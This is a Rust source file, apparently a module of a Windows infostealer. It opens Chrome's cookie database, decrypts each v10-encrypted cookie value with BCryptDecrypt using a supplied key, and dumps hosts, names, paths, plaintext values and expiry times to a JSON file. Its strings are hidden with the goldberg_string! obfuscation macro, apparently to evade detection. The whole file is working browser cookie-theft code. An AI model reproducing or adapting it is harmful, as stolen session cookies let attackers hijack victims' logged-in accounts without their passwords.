use crate::import_libs::*;
use goldberg::goldberg_string;
use rusqlite::Statement;
use std::ffi::c_void;
use std::fs::File;
use std::io::Write;
use std::{mem, slice};

#[derive(Debug)]
struct CookieChrome {
    host_key: String,
    name: String,
    path: String,
    value: Vec<u8>,
    expires_utc: i64,
}

pub struct ChromeCookies {
    file_path: String,
}

impl ChromeCookies {
    pub fn new(path: &str) -> Self {
        ChromeCookies {
            file_path: String::from(path),
        }
    }

    pub unsafe fn query_sqlite(self, key_handle: BCRYPT_KEY_HANDLE, file_name: &str) -> Result<()> {
        let mut file = File::create(file_name).unwrap();
        let mut count = 0;
        file.write_all("chrome[\n".as_bytes()).unwrap();
        let connection = Connection::open(self.file_path)?;
        let mut stmt = connection.prepare(goldberg_string!(
            "SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies"
        ))?;
        let cookies = stmt.query_map([], |row| {
            Ok(CookieChrome {
                host_key: row.get(0)?,
                name: row.get(1)?,
                path: row.get(2)?,
                value: row.get(3)?,
                expires_utc: row.get(4)?,
            })
        })?;

        for cookie in cookies {
            let data = cookie.unwrap();
            let mut encrypted_value = data.value;
            if encrypted_value[0] == 118 && encrypted_value[1] == 49 && encrypted_value[2] == 48 {
                let mut bacmi = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO::default();
                bacmi.cbSize = mem::size_of::<BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO>() as u32;
                bacmi.dwInfoVersion = 1;

                bacmi.pbNonce = encrypted_value.as_ptr().add(3) as *mut u8;
                bacmi.cbNonce = 12;

                let encrypted_value_size: usize = encrypted_value.len();
                bacmi.pbTag = encrypted_value.as_ptr().add(encrypted_value_size - 16) as *mut u8;
                bacmi.cbTag = 16;

                let input = encrypted_value.as_ptr().add(15);
                let mut slice: &[u8] =
                    unsafe { slice::from_raw_parts(input, encrypted_value_size - 15 - 16) };
                let info_ptr =
                    &bacmi as *const BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO as *const c_void;
                let mut output: [u8; 8196] = [0; 8196];
                let mut pcbresult = 0u32;
                let ntstatus = BCryptDecrypt(
                    key_handle,
                    Some(slice),
                    Some(info_ptr),
                    None,
                    Some(&mut output),
                    &mut pcbresult,
                    BCRYPT_FLAGS::default(),
                );
                if ntstatus.0 != 0 {
                    break;
                }
                let string_result: String = String::from_utf8_lossy(output.as_slice())
                    .split_terminator('\0')
                    .collect();
                let json_data = serde_json::json!({
                    goldberg_string!("host_key"): data.host_key,
                     goldberg_string!("name"): data.name,
                     goldberg_string!("path"): data.path,
                     goldberg_string!("value"): string_result,
                     goldberg_string!("expires_utc"): data.expires_utc,
                });
                if (count != 0) {
                    file.write_all(",\n".as_bytes()).unwrap();
                }
                count += 1;
                file.write_all(serde_json::to_string_pretty(&json_data).unwrap().as_bytes())
                    .unwrap();
            }
        }
        file.write_all("]\n".as_bytes()).unwrap();
        Ok(())
    }
}
